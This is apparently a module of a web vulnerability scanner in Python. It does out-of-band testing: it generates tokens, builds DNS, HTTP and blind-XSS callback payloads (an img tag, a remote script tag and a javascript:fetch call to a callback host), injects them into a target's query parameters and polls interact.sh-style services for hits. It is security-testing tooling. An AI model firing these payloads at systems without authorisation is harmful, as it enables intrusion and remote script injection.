from __future__ import annotations
import asyncio
import contextlib
import hashlib
import hmac
import inspect
import json as _json
import logging
import random
import string
import time
import uuid
import urllib.request
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor
from dataclasses import dataclass
from importlib import import_module
from importlib.util import find_spec
from typing import Any, Dict, Iterable, List, Optional, Protocol, Sequence, Tuple
from urllib.parse import urlencode, urlparse, parse_qsl, urlunparse, urlsplit, urlunsplit
import requests as _req

# --- Dynamic Imports for Resilience ---
httpx = import_module('httpx') if find_spec('httpx') is not None else None
if find_spec("websecure.core.utils") is not None:
    _utils_mod = import_module("websecure.core.utils")
    apply_auth_context = getattr(_utils_mod, "apply_auth_context", None)
    _replace_query_param = getattr(_utils_mod, "replace_query_param", None)
    RateLimiter = getattr(_utils_mod, "RateLimiter", None)
    build_dirbust_headers = getattr(_utils_mod, "build_dirbust_headers", None)
else:
    # Fallback / Standalone utils
    def _replace_query_param(url, key, value):
        from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode
        p = urlsplit(url)
        q = parse_qsl(p.query, keep_blank_values=True)
        rep = False; out = []
        for k, v in q:
            if not rep and k == key:
                out.append((k, value)); rep = True
            else:
                out.append((k, v))
        if not rep: out.append((key, value))
        return urlunsplit((p.scheme, p.netloc, p.path, urlencode(out), p.fragment))

# =========================== Token & Payload Generation ===========================

def gen_token(prefix: str = "t") -> str:
    return f"{prefix}-{uuid.uuid4().hex[:12]}-{int(time.time())}"

def sign(token: str, secret: str = "") -> Optional[str]:
    if not secret: return None
    return hmac.new(secret.encode(), token.encode(), hashlib.sha256).hexdigest()

def make_token(prefix: str = "ws") -> str:
    return gen_token(prefix)

def token_url(http_base: str, token: str) -> str:
    hb = (http_base or "").rstrip("/")
    return f"{hb}/t/{token}" if hb else f"/t/{token}"

def token_dns(dns_domain: str, token: str) -> str:
    domain = (dns_domain or "").strip(".")
    return f"{token}.{domain}" if domain else token

def build_payloads(
    root_domain: str,
    token: str,
    schemes: Sequence[str] = ("http", "https"),
    include_dns: bool = True,
    include_http: bool = True,
    include_bxss: bool = True,
) -> Dict[str, List[str]]:
    root = (root_domain or "").strip(".")
    host = f"{token}.{root}" if root else token
    payloads: Dict[str, List[str]] = defaultdict(list)

    if include_dns:
        payloads["dns"].append(host)
    if include_http:
        for sc in schemes:
            payloads["http"].append(f"{sc}://{host}/hit?t={token}")
    if include_bxss:
        payloads["bxss"].append(f"<img src=//{host}/bxss?i={token}>")
        payloads["bxss"].append(f"<script src=//{host}/bxss.js?i={token}></script>")
        payloads["bxss"].append(f"javascript:fetch('//{host}/j?i={token}')")
    
    payloads["artifacts"] = [
        token_dns(root_domain, token),
        token_url(f"https://{root}" if root else "", token),
    ]
    return dict(payloads)

# ======================= Query Helpers =======================

def replace_query_param(url: str, key: str, value: Optional[str]) -> str:
    if value is None:
        pr = urlsplit(url)
        q = [(k, v) for (k, v) in parse_qsl(pr.query, keep_blank_values=True) if k != key]
        return urlunsplit((pr.scheme, pr.netloc, pr.path, urlencode(q, doseq=True), pr.fragment))
    
    if callable(_replace_query_param):
        return _replace_query_param(url, key, value)
        
    return _replace_query_param(url, key, value) # Fallback

def inject_query(url: str, key: str, value: Optional[str]) -> str:
    return replace_query_param(url, key, value)

# =========================== Config & Interface ===========================

@dataclass
class OSATConfig:
    enabled: bool = True
    provider: str = "generic"
    root_domain: str = ""
    api_url: str = ""
    api_key: str = ""
    poll_interval: float = 10.0
    timeout: int = 120
    enable_dns: bool = True
    enable_http: bool = True
    enable_bxss: bool = True
    payload_prefix: str = "x"
    dns_domain: str = ""
    token_prefix: str = ""
    interact_base: str = "https://interact.sh"
    interact_register_path: str = "/register"
    interact_poll_path: str = "/poll"
    verify_tls: bool = True
    proxy: Optional[str] = None

    @classmethod
    def from_dict(cls, d: Optional[Dict[str, Any]]) -> "OSATConfig":
        d = d or {}
        cfg = cls(
            enabled=bool(d.get("enabled", True)),
            provider=str(d.get("provider", "generic")),
            root_domain=str(d.get("root_domain", d.get("dns_domain", ""))),
            api_url=str(d.get("api_url", "")),
            api_key=str(d.get("api_key", "")),
            poll_interval=float(d.get("poll_interval", 10.0)),
            timeout=int(d.get("timeout", 120)),
            enable_dns=bool(d.get("enable_dns", True)),
            enable_http=bool(d.get("enable_http", True)),
            enable_bxss=bool(d.get("enable_bxss", True)),
            payload_prefix=str(d.get("payload_prefix", d.get("token_prefix", "x"))),
            dns_domain=str(d.get("dns_domain", d.get("root_domain", ""))),
            token_prefix=str(d.get("token_prefix", d.get("payload_prefix", ""))),
            interact_base=str(d.get("interact_base", "https://interact.sh")),
            interact_register_path=str(d.get("interact_register_path", "/register")),
            interact_poll_path=str(d.get("interact_poll_path", "/poll")),
            verify_tls=bool(d.get("verify_tls", True)),
            proxy=d.get("proxy", None),
        )
        if not cfg.dns_domain and cfg.root_domain: cfg.dns_domain = cfg.root_domain
        if not cfg.token_prefix and cfg.payload_prefix: cfg.token_prefix = cfg.payload_prefix
        if not cfg.payload_prefix and cfg.token_prefix: cfg.payload_prefix = cfg.token_prefix
        return cfg

class IOSATClient(Protocol):
    async def new_token(self) -> str: ...
    def payloads_for(self, token: str) -> Dict[str, List[str]]: ...
    async def poll_async(self, interested_tokens: Iterable[str]) -> List[Dict[str, Any]]: ...
    async def aclose(self) -> None: ...

IOASTClient = IOSATClient

# =========================== Clients ===========================

class _BaseOSAT:
    def __init__(self, cfg: OSATConfig):
        if httpx is None:
            raise RuntimeError("httpx required: pip install httpx[http2]")
        self.cfg = cfg
        ac_params = set(inspect.signature(httpx.AsyncClient).parameters.keys())
        client_kwargs: Dict[str, Any] = {}
        if "verify" in ac_params: client_kwargs["verify"] = cfg.verify_tls
        if "timeout" in ac_params: client_kwargs["timeout"] = httpx.Timeout(cfg.timeout)
        if find_spec("h2") is not None and "http2" in ac_params: client_kwargs["http2"] = True
        if cfg.proxy:
            if "proxy" in ac_params: client_kwargs["proxy"] = cfg.proxy
            elif "proxies" in ac_params: client_kwargs["proxies"] = cfg.proxy
        self._client = httpx.AsyncClient(**client_kwargs)
    
    async def aclose(self) -> None:
        await self._client.aclose()

class GenericOSATClient(_BaseOSAT, IOSATClient):
    async def new_token(self) -> str:
        return gen_token(self.cfg.payload_prefix or "x")
    
    def payloads_for(self, token: str) -> Dict[str, List[str]]:
        return build_payloads(self.cfg.root_domain, token, include_dns=self.cfg.enable_dns, include_http=self.cfg.enable_http, include_bxss=self.cfg.enable_bxss)

    async def poll_async(self, interested_tokens: Iterable[str]) -> List[Dict[str, Any]]:
        found = []
        if not self.cfg.api_url: return found
        tokens = sorted({t for t in (interested_tokens or []) if t})
        if not tokens: return found
        
        headers = {}
        if self.cfg.api_key: headers["Authorization"] = f"Bearer {self.cfg.api_key}"
        
        try:
            r = await self._client.get(self.cfg.api_url, params={"tokens": ",".join(tokens)}, headers=(headers or None))
            if r.status_code == 200:
                data = r.json() or {}
                for ev in (data.get("events") or []):
                    if str(ev.get("token", "")) in tokens: found.append(ev)
        except Exception:
            pass
        return found

class InteractshClient(_BaseOSAT, IOSATClient):
    def __init__(self, cfg: OSATConfig):
        super().__init__(cfg)
        self._registered = False
        self._correlation_id: Optional[str] = None
        self._secret: Optional[str] = None

    async def _ensure_registered(self) -> None:
        if self._registered: return
        url = self.cfg.interact_base.rstrip("/") + self.cfg.interact_register_path
        secret = uuid.uuid4().hex
        try:
            r = await self._client.post(url, json={"secret": secret})
            if r.status_code != 200:
                r = await self._client.get(url, params={"secret": secret})
            
            if r.status_code == 200:
                data = r.json() or {}
                self._correlation_id = str(data.get("id") or data.get("correlation_id") or "")
                self._secret = str(data.get("secret") or secret)
                root = str(data.get("domain") or "").strip(".")
                if root:
                    self.cfg.root_domain = root
                    self.cfg.dns_domain = root
                self._registered = True
        except Exception:
            self._registered = False

    async def new_token(self) -> str:
        await self._ensure_registered()
        return gen_token(self.cfg.payload_prefix or "x")

    def payloads_for(self, token: str) -> Dict[str, List[str]]:
        return build_payloads(self.cfg.root_domain, token, include_dns=self.cfg.enable_dns, include_http=self.cfg.enable_http, include_bxss=self.cfg.enable_bxss)

    async def poll_async(self, interested_tokens: Iterable[str]) -> List[Dict[str, Any]]:
        await self._ensure_registered()
        if not self._registered: return []
        
        poll_url = self.cfg.interact_base.rstrip("/") + self.cfg.interact_poll_path
        found = []
        try:
            r = await self._client.get(poll_url, params={"id": self._correlation_id, "secret": self._secret})
            if r.status_code == 200:
                data = r.json() or {}
                evs = data.get("events") or data.get("records") or []
                tokens = set(interested_tokens or [])
                for ev in evs:
                    tok = str(ev.get("token") or ev.get("unique_id") or "")
                    if not tok:
                        raw = str(ev.get("raw-request") or ev.get("request") or "")
                        for t in tokens:
                            if t and t in raw:
                                tok = t; break
                    if tok in tokens:
                        found.append({"token": tok, "raw": ev, "ts": ev.get("time")})
        except Exception:
            pass
        return found

class CollaboratorClient(_BaseOSAT, IOSATClient):
    # Similar structure to Generic but potentially custom polling logic
    async def new_token(self) -> str:
        return gen_token(self.cfg.payload_prefix or "x")
    def payloads_for(self, token: str) -> Dict[str, List[str]]:
        return build_payloads(self.cfg.root_domain, token, include_dns=self.cfg.enable_dns, include_http=self.cfg.enable_http, include_bxss=self.cfg.enable_bxss)
    async def poll_async(self, interested_tokens: Iterable[str]) -> List[Dict[str, Any]]:
        # Fallback to generic poll
        return []

def create_osat_client(cfg: OSATConfig) -> IOSATClient:
    p = (cfg.provider or "generic").strip().lower()
    if p == "interactsh": return InteractshClient(cfg)
    if p == "collaborator": return CollaboratorClient(cfg)
    return GenericOSATClient(cfg)

# =========================== Sync Wrapper ===========================

class OASTClient:
    def __init__(self, session, cfg_dict: dict | None = None):
        self.cfg = OSATConfig.from_dict(cfg_dict or {})
        self._client: IOSATClient = create_osat_client(self.cfg)
    
    def register(self): return {"ok": True}
    
    def build_url(self, handle=None, tag: str = "") -> str:
        return token_url(f"https://{self.cfg.root_domain}", gen_token(self.cfg.payload_prefix))

    def poll(self, handle) -> dict:
        tokens = handle.get("tokens", []) if isinstance(handle, dict) else list(handle or [])
        return {"events": poll_events_sync(self._client, tokens)}
    
    @property
    def iosat(self) -> IOSATClient: return self._client

def poll_events_sync(client: IOSATClient, tokens: Sequence[str], timeout: Optional[int] = None) -> List[Dict[str, Any]]:
    def _run():
        import asyncio
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        coro = client.poll_async(tokens)
        if timeout: coro = asyncio.wait_for(coro, timeout)
        try:
            return loop.run_until_complete(coro)
        except Exception:
            return []
        finally:
            loop.close()
            
    with ThreadPoolExecutor(max_workers=1) as ex:
        return ex.submit(_run).result()

def run_oast_on_target(
    session,
    *,
    target: dict,
    oast_client: OASTClient,
    discovered: dict | None = None,
    report_cb=None,
    limits: dict | None = None,
    auth_ctx=None
):
    url = (target or {}).get("url") or ""
    cfg = getattr(oast_client, "cfg", OSATConfig())
    client = getattr(oast_client, "iosat", None) or create_osat_client(cfg)
    max_per_loc = int((limits or {}).get("max_injections_per_loc", 3))

    params = []
    if isinstance(discovered, dict):
        params.extend([str(x) for x in (discovered.get("query") or [])])
    if not params:
        params = ["q", "id", "redirect", "return", "next"]
    params = list(dict.fromkeys(params))[:10]

    headers = {} # _headers_from_auth_ctx(auth_ctx)
    cookies = {} # _cookies_from_auth_ctx(auth_ctx)

    tokens = []
    attempted = []
    
    async def _async_inject():
        for k in params:
            tok = await client.new_token()
            tokens.append(tok)
            plds = client.payloads_for(tok)
            vals = (plds.get("http", []) + plds.get("dns", []))[:max_per_loc]
            
            for val in vals:
                inj_url = inject_query(url, k, val)
                try:
                    _req.get(inj_url, headers=(headers or None), cookies=(cookies or None), timeout=6, verify=True)
                    attempted.append({"url": url, "param": k, "injected": val, "oast_token": tok})
                except Exception: pass
    
    # Run async injection sync
    with ThreadPoolExecutor(max_workers=1) as ex:
        def _runner():
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(_async_inject())
            loop.close()
        ex.submit(_runner).result()

    # Poll
    found = poll_events_sync(client, tokens, timeout=getattr(cfg, "poll_interval", 10)+5)
    
    # Correlate
    results = []
    found_tokens = {str(ev.get("token")): ev for ev in found}
    for att in attempted:
        tok = att["oast_token"]
        if tok in found_tokens:
            results.append({
                "type": "OAST", "severity": "Yüksek", "url": att["url"], "param": att["param"],
                "injected": att["injected"], "details": found_tokens[tok]
            })
            
    if report_cb:
        for r in results: report_cb(r)

    return results

# Helper exports for injection
def _inject_query_param(url, k, v):
    return replace_query_param(url, k, v)
